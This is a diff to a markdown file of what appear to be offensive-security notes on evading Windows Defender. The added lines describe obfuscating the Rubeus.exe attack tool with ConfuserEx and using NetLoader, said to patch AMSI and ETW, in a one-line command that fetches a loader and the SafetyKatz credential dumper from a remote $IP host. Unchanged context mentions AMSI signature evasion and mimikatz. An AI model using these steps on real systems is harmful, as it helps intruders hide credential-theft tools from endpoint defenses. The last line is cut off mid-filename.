@@ -43,6 +43,8 @@ $classrev = ([regx]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) - 
 - Analysis using DenfenderCheck
 - DefenderCheck
 
+#### Payload Delivery
+
 
 
 ---
@@ -75,4 +77,15 @@ $f = "mimikatz_trunk.zip"
 	- Add this after zipstream, `zipStream = Convert.FromBase64String(base64value)`
 
 __ConfuserEx (Rubeus.exe)__
-- 
+- In project tab, select base directory
+- In project tab, select binary file
+- In settings tab, add rules
+- In settings tab, edit the rule and select the preset as 'Normal'
+- In protect tab, click on protect
+
+#### Payload Delivery
+__NetLoader__
+- Patches AMSI & ETW while excuting
+```powershell
+AssemblyLoad.exe $IP/Loader.exe -path $IP/safetykatz.e
+```
